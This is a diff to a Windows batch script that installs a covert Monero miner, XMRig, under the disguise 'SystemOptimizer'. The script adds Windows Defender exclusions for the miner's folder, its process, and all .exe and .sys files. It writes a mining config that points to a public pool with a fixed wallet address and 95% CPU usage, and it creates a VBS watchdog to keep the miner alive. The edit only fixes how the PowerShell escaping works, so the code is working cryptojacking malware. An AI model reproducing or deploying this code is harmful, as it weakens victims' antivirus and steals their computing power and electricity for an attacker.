@@ -18,10 +18,10 @@ del "%TEMP%\xmrig.zip" >nul 2>&1
 REM Defender exclusions
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\SystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 
-REM Create config.json
-powershell -Command "$config = @{ autosave=\$false; background=\$true; colors=\$false; 'donate-level'=1; 'log-file'='C:\ProgramData\SystemOptimizer\optimizer.log'; 'print-time'=30; retries=5; 'retry-pause'=10; cpu=@{ enabled=\$true; 'huge-pages'=\$true; 'huge-pages-jit'=\$true; 'hw-aes'=\$true; priority=1; yield=\$true; 'max-cpu-usage'=95; asm=\$true; 'argon2-impl'='auto'; 'max-threads-hint'=100 }; pools=@(@{ url='gulf.moneroocean.stream:10001'; user='435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv'; pass='x'; keepalive=\$true; tls=\$false; nicehash=\$false; 'rig-id'=\$env:COMPUTERNAME }); api=@{ enabled=\$true; host='127.0.0.1'; port=3456; restricted=\$true } } | ConvertTo-Json -Depth 5 | Out-File -FilePath 'C:\ProgramData\SystemOptimizer\config.json' -Encoding ascii" >nul 2>&1
+REM Create config.json - escape $ for batch
+powershell -Command "$config = @{ autosave=`$false; background=`$true; colors=`$false; 'donate-level'=1; 'log-file'='C:\ProgramData\SystemOptimizer\optimizer.log'; 'print-time'=30; retries=5; 'retry-pause'=10; cpu=@{ enabled=`$true; 'huge-pages'=`$true; 'huge-pages-jit'=`$true; 'hw-aes'=`$true; priority=1; yield=`$true; 'max-cpu-usage'=95; asm=`$true; 'argon2-impl'='auto'; 'max-threads-hint'=100 }; pools=@(@{ url='gulf.moneroocean.stream:10001'; user='435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv'; pass='x'; keepalive=`$true; tls=`$false; nicehash=`$false; 'rig-id'=`$env:COMPUTERNAME }); api=@{ enabled=`$true; host='127.0.0.1'; port=3456; restricted=`$true } } | ConvertTo-Json -Depth 5 | Out-File -FilePath 'C:\ProgramData\SystemOptimizer\config.json' -Encoding ascii" >nul 2>&1
 
-REM Create watchdog.vbs using simple echo (no PowerShell here-string issues)
+REM Create watchdog.vbs using simple echo
 echo Set sh = CreateObject("WScript.Shell") > "C:\ProgramData\SystemOptimizer\watchdog.vbs"
 echo Set wmi = GetObject("winmgmts:") >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
 echo If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count ^> 1 Then WScript.Quit >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
